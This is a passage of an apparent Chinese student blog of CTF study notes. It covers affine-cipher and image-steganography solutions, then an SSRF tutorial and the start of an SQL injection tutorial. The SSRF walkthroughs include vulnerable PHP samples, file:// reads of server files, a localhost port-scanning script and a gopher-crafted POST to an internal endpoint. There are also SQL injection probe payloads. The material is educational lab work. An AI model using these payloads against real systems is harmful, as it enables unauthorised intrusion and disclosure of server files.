class="line">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0=</span><br></pre></td></tr></table></figure><p>下面那句话是什么意思-最后一层是单表替换密码</p><p>我们先利用赛博厨子</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-168.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvueiakxudsyqehszqhykggsyylkvvi</span><br></pre></td></tr></table></figure><p>搜了一下网上的wp，说的是仿射密码</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-169.png" alt="img"></p><p>涉及文件名中19，20，跑一个仿射密码的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">仿射密码</span></span><br><span class="line"><span class="string">(a,b)</span></span><br><span class="line"><span class="string">m = 26，字符集为小写字母</span></span><br><span class="line"><span class="string">加密函数是E(x)= (ax + b) (mod m)</span></span><br><span class="line"><span class="string">解密函数为D(x) = (a^-1)(x - b) (mod m)，其中a^-1是a的乘法逆元</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个简单的遍历得到a的乘法逆元，也可以通过gmpy2库中的invert函数实现</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_inverse</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">if</span> a*i%<span class="number">26</span>==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encipher</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    c=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        temp=((<span class="built_in">ord</span>(i)-<span class="number">97</span>)*a+b)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        c.append(<span class="built_in">chr</span>(temp))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(c))</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decipher</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    a_inv = get_inverse(a)</span><br><span class="line">    p=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        temp=(((<span class="built_in">ord</span>(i)-<span class="number">97</span>)-b)*a_inv)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        p.append(<span class="built_in">chr</span>(temp))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    a = <span class="number">19</span></span><br><span class="line">    b = <span class="number">20</span></span><br><span class="line">    message = <span class="string">&#x27;lvueiakxudsyqehszqhykggsyylkvvi&#x27;</span></span><br><span class="line">    <span class="comment"># encipher(a,b,message)</span></span><br><span class="line">    decipher(a,b,message)</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-170.png" alt="img"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;you_have_signed_in_successfully&#125;</span><br></pre></td></tr></table></figure><p>这道题也可以直接利用<code>quipquip</code>，直接搜索就好</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-171.png" alt="img"></p><p>直接获得flag的格式，加上下划线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag you paresigned in successfully</span><br></pre></td></tr></table></figure><h2 id="GDOUCTF-2023-pixelart"><a href="#GDOUCTF-2023-pixelart" class="headerlink" title="GDOUCTF 2023]pixelart"></a>GDOUCTF 2023]pixelart</h2><p>打开后是这样的一幅图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTRiMDU2NTBlYjg2YzBjNDlmMTg2Njc2NDQzYjYxMjhfVUxvc3FvcWlQc2g0ZU9NZEZWVTZXTG83RzJRQnQ5OVhfVG9rZW46TFNTQWJnWEdjb1VXcmh4MDBVQ2NBMFVXbktnXzE3NDY2MTc1ODI6MTc0NjYyMTE4Ml9WNA" alt="img"></p><p>这样并没有看出来什么东西，依旧按照常规思路，放进010中查看</p><p>我们在最后发现</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-173.png" alt="img"></p><p>这可能是要让我们修改一下长宽，我们先看一下图片属性</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674610-174.png" alt="img"></p><p>正好是12倍的关系</p><p>那我们给他改一下</p><p>我们利用脚本来改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">r&#x27;D:\NSSCTF\pixelart\arcaea.png&#x27;</span>)  <span class="comment"># 使用原始字符串</span></span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>, (w // <span class="number">12</span>, h // <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w // <span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h // <span class="number">12</span>):</span><br><span class="line">        (r, g, b) = img.getpixel((x * <span class="number">12</span>, y * <span class="number">12</span>))</span><br><span class="line">        img_obj.putpixel((x, y), (r, g, b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">r&#x27;D:\NSSCTF\pixelart\ok.png&#x27;</span>)  <span class="comment"># 使用原始字符串</span></span><br></pre></td></tr></table></figure><p>就得到了一个新的图</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674610-175.png" alt="img"></p><p>但是这个是假的</p><p>我们继续将这张图放进010中，看到了里面的</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674610-176.png" alt="img"></p><p>可能是lsb，我们利用stegsolve来解决</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674610-177.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674610-178.png" alt="img"></p><p>看到了这个，就找到了我们需要的flag，再进行修改（需要把里面的空格删去)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;J3st_2_cats_battling&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3-web-SSRF</title>
      <link href="/2025/04/28/week3-web-SSRF/"/>
      <url>/2025/04/28/week3-web-SSRF/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/week3-web-SSRF.assets/1746618039029-17.png" alt="img"></p><p>上面是大概的整个框架，咱们一个一个来</p><h1 id="SSRF漏洞介绍及原理"><a href="#SSRF漏洞介绍及原理" class="headerlink" title="SSRF漏洞介绍及原理"></a>SSRF漏洞介绍及原理</h1><p>主要由攻击者构造请求，由服务端发起请求的安全漏洞，差不多就是信息泄露漏洞。攻击的目标是外网无法访问的内部系统。</p><p>形成是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h1><ul><li>对外网，服务器所在内网，本地进行端口扫描，获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序。</li><li>攻击内外网的web应用，使用http get请求就可以实现</li><li>利用file协议读取本地文件</li></ul><h1 id="漏洞产生的相关函数："><a href="#漏洞产生的相关函数：" class="headerlink" title="漏洞产生的相关函数："></a>漏洞产生的相关函数：</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];;  <span class="comment">#从URL参数中获取名url的值，并将其赋给变量$url,同时就意味着攻击者可通过修改URL直接控制这个变量</span></span><br><span class="line">echo file_get_contents($url);   <span class="comment">#使用file_get_contents()函数读取由$url指定的内容，并通过echo输出到页面上。</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。</p><p>这个函数把一个字符串写入文件中</p><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><code>fsockopen()</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) &#123; </span><br><span class="line">    <span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>;    <span class="comment">#检查是否连接成功，若上述返回false，则输出错误信息并结束执行。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); &#125;</span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$contents</span>;  <span class="comment">#fgets()函数逐行读取服务器返回的数据，并且读取的内容被追加到变量$contents中，最后，关闭socket连接并返回收集的所有数据。 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数实现对用户指定url数据的获取，使用socket连接，使用fsockopen()函数尝试与远端服务器建立TCP&#x2F;IP连接。若连接成功，返回一个资源标识符；反之返回false。</p><p><code> host</code>是主机名，<code>port</code>是端口，<code>errstr</code>表示错误信息将以字符串的信息返回，且以30为时限</p><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><code>curl_exec()</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();  <span class="comment"># 创建新的 cURL 资源</span></span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);   <span class="comment">#设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);# 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);# 关闭 cURL 资源，并且释放系统资源</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个函数用于执行指定的cURL会话</p><h3 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a>注意！！</h3><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li>file_get_contents的gopher协议不能URL编码</li><li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li><li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li>curl_exec() &#x2F;&#x2F;默认不跟踪跳转</li><li>file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</li></ol><h1 id="看一些相关例题"><a href="#看一些相关例题" class="headerlink" title="看一些相关例题"></a>看一些相关例题</h1><h2 id="CTFHUB-内网访问"><a href="#CTFHUB-内网访问" class="headerlink" title="CTFHUB-内网访问"></a>CTFHUB-内网访问</h2><p><img src="/../images/week3-web-SSRF.assets/1746618039025-1.png" alt="img"></p><p>图中包含关键信息 尝试访问位于127.0.0.1的flag.php</p><p>已经提示要访问的内网地址，并且输入进去回车一下并没有被挡住</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-37f9ce83319ff7da.sandbox.ctfhub.com:10800/?url=``127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>如上图，得到</p><p><img src="/../images/week3-web-SSRF.assets/1746618039025-2.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;c73c88945792dbcb94a739d9&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-伪协议读取文件"><a href="#CTFHUB-伪协议读取文件" class="headerlink" title="CTFHUB-伪协议读取文件"></a>CTFHUB-伪协议读取文件</h2><p><img src="/../images/week3-web-SSRF.assets/1746618039026-3.png" alt="img"></p><p>根据给出的提示，读取web目录下的flag.php,所以我们应该知道web目录地址，通常情况下是在<code>/var/www/html/</code></p><p>还有一个知识预备：</p><p>file:&#x2F;&#x2F;     -访问本地文件系统</p><p>http:&#x2F;&#x2F;    -访问http(s)网址</p><p>…….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-aad86e53e0aa9832.sandbox.ctfhub.com:10800/?``url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="/../images/week3-web-SSRF.assets/1746618039026-4.png" alt="img"></p><p>查看源码后获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;381b765b9f4b42b05d4ff235&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-端口扫描"><a href="#CTFHUB-端口扫描" class="headerlink" title="CTFHUB-端口扫描"></a>CTFHUB-端口扫描</h2><p><img src="/../images/week3-web-SSRF.assets/1746618039026-5.png" alt="img"></p><h3 id="解法一：利用Burp"><a href="#解法一：利用Burp" class="headerlink" title="解法一：利用Burp"></a>解法一：利用Burp</h3><p><img src="/../images/week3-web-SSRF.assets/1746618039026-6.png" alt="img"></p><p><img src="/../images/week3-web-SSRF.assets/1746618039026-7.png" alt="img"></p><p><img src="/../images/week3-web-SSRF.assets/1746618039026-8.png" alt="img"></p><p>开始攻击</p><p><img src="/../images/week3-web-SSRF.assets/1746618039026-9.png" alt="img"></p><p>找到长度不同对应的端口，8468</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/``?url=127.0.0.1:8468</span><br></pre></td></tr></table></figure><p><img src="/../images/week3-web-SSRF.assets/1746618039026-10.png" alt="img"></p><h3 id="解法二：利用脚本"><a href="#解法二：利用脚本" class="headerlink" title="解法二：利用脚本"></a>解法二：利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests    <span class="comment">#导入repuests库，用于发送http请求</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>, <span class="number">9001</span>):      <span class="comment">#用于遍历窗口8000-9000</span></span><br><span class="line">    url_1 = <span class="string">f&#x27;http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/?url=127.0.0.1:<span class="subst">&#123;index&#125;</span>&#x27;</span></span><br><span class="line">    res = requests.get(url_1)    <span class="comment">#发送get请求</span></span><br><span class="line">    <span class="built_in">print</span>(index, res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/week3-web-SSRF.assets/1746618039026-11.png" alt="img"></p><p>当运行到对应端口，出现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;2eca6e24d819312c473a34d1&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-POST请求"><a href="#CTFHUB-POST请求" class="headerlink" title="CTFHUB-POST请求"></a>CTFHUB-POST请求</h2><p><img src="/../images/week3-web-SSRF.assets/1746618039026-12.png" alt="img"></p><p>看提示</p><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><p>我们先试着通过GET访问一下flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-42b6c44fe6645614.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="/../images/week3-web-SSRF.assets/1746618039027-13.png" alt="img"></p><p>查看一下源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11204e9be51c95a55882a55de3d9c4aa--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那我们就在输入框中输入key的值</p><p>显示一下页面</p><p><img src="/../images/week3-web-SSRF.assets/1746618039027-14.png" alt="img"></p><p>意思是我们只被允许从127.0.0.1中访问</p><p>尝试通过file协议读取index.php和flag.php的源码，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/index.php</span><br><span class="line">?url=file:///var/www/html/flag.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&quot;key&quot;</span>]) &amp;&amp; $_POST[<span class="string">&quot;key&quot;</span>] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>我们使用Gopher 协议向服务器发送POST包，下面是构造的请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span></span><br><span class="line">Content-Length: <span class="number">36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=<span class="number">11204e9</span>be51c95a55882a55de3d9c4aa</span><br></pre></td></tr></table></figure><p>下面是利用赛博厨子对url编码进行编码</p><p><img src="/../images/week3-web-SSRF.assets/1746618039027-15.png" alt="img"></p><p><img src="/../images/week3-web-SSRF.assets/1746618039027-16.png" alt="img"></p><p>发送post请求，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;697c699c9719bbf6a98fa2d9&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week2-web</title>
      <link href="/2025/04/28/week2-web-SQL/"/>
      <url>/2025/04/28/week2-web-SQL/</url>
      
        <content type="html"><![CDATA[<p>一般情况下，通过post方式传入一个参数id来查询数据库的内容。</p><h2 id="判断sql语句闭合方式"><a href="#判断sql语句闭合方式" class="headerlink" title="判断sql语句闭合方式"></a>判断sql语句闭合方式</h2><p>当在id的值后面加上<code>&#39;</code>时，界面无回显，就可以判断后面的sql语句应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxxx from xxxx where id = &#x27;input_id&#x27; [xxxx]</span><br></pre></td></tr></table></figure><p>意思表示：“从名为‘xxxx’的表中选择列‘xxxx’的所有数据，但只包括那些其’id’列与给定的’input_id’相匹配的行。”</p><p><code>xxxx</code>是占位符，第一个<code>xxxx</code>会被实际的列名替换；第二个<code>xxxx</code>会被表名替换。<code>input_id</code>被替换成想要查找的具体id值。</p><h3 id="常见闭合模式判断表"><a href="#常见闭合模式判断表" class="headerlink" title="常见闭合模式判断表"></a>常见闭合模式判断表</h3><table><thead><tr><th>页面反应</th><th>可能闭合方式</th></tr></thead><tbody><tr><td>1’ 报错</td><td>数字型或双引号</td></tr><tr><td>1’ 正常</td><td>单引号闭合</td></tr><tr><td>1’– 正常</td><td>单引号闭合</td></tr><tr><td>1’) 报错</td><td>非括号闭合</td></tr><tr><td>1’)– 正常</td><td>单引号+括号闭合</td></tr><tr><td>1’ 和 1’ AND ‘1’&#x3D;’1 都正常</td><td>单引号闭合</td></tr></tbody></table><h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><ol><li><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2></li></ol><p>寻找可能存在漏洞的参数</p><p>在参数值后添加<code>&#39;</code>,<code>&quot;</code>,<code>()</code>等payload来判断注入点，查看返回结果，如果报错，则可能这个参数存在注入漏洞。</p><ol><li><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2></li></ol><h3 id="数字型注入的sql语句"><a href="#数字型注入的sql语句" class="headerlink" title="数字型注入的sql语句"></a>数字型注入的sql语句</h3><p>一般形式：<code>select * from 【表名】 where id = 1</code></p><h4 id="如何测试："><a href="#如何测试：" class="headerlink" title="如何测试："></a>如何测试：</h4><ul><li>加单引号<code>&#39;</code>,这种情况会报错；</li><li>加<code>and 1=1</code>，语句正常执行，无回显；</li><li>加<code>and 1=2</code>，正常执行，但有回显；</li></ul><p>以上三点 满足，则此处存在数字型注入</p><h3 id="字符型注入的sql语句"><a href="#字符型注入的sql语句" class="headerlink" 